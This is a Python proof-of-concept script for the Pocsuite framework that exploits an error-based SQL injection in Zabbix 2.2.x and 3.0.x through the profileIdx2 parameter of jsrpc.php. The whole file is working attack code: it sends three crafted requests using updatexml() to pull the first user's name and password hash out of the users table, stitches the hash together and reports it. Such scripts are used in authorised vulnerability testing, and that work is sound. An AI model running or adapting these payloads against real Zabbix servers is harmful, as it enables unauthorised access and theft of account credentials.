#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import re

class TestPOC(POCBase):
    vulID = '0'
    version = '0'
    author = 'jeffzhang'
    vulDate = '2017-08-26'
    createDate = '2017-08-26'
    updateDate = '2017-08-26'
    references = ['http://www.freebuf.com/vuls/112197.html']
    name = 'Zabbix SQl 注入漏洞(获取账户密码)'
    appPowerLink = 'https://www.zabbix.com'
    appName = 'Zabbix'
    appVersion = '3.0.3'
    vulType = 'SQL Injection'
    desc = '''
    	Zabbix 2.2.x和3.0.x版本中存在两处基于错误回显的SQL注入漏洞
    '''
    samples = ['']

    def _verify(self):
        try:
            result = {}
            headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0'}
            payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999 or updatexml(1,concat(0x7e,(select substr(concat(surname),1,31) from users limit 0,1)),0)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            att_url = self.url + payload
            response = req.get(att_url,headers=headers,timeout=10)

            #获取用户名
            info_name = re.search(r'\[XPATH syntax error: \'~(.*?)\'\]',response.content)

            #获取密码
            payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999 or updatexml(1,concat(0x7e,(select substr(concat(passwd),1,31) from users limit 0,1)),0)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            att_url = self.url + payload
            response = req.get(att_url,timeout=10)
            info_pwd = re.search(r'\[XPATH syntax error: \'~(.*?)\'\]',response.content)

            payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999 or updatexml(1,concat(0x7e,(select substr(concat(passwd),32,32) from users limit 0,1)),0)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            att_url = self.url + payload
            response = req.get(att_url,timeout=10)
            info_pwd_end = re.search(r'\[XPATH syntax error: \'~(.*?)\'\]',response.content)

            if info_name and info_pwd and info_pwd_end:
                username = info_name.group(1)
                password = info_pwd.group(1) + info_pwd_end.group(1)
                result['DBInfo'] = {}
                result['DBInfo']['Username'] = username
                result['DBInfo']['Password'] = password
        except Exception:
            pass
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
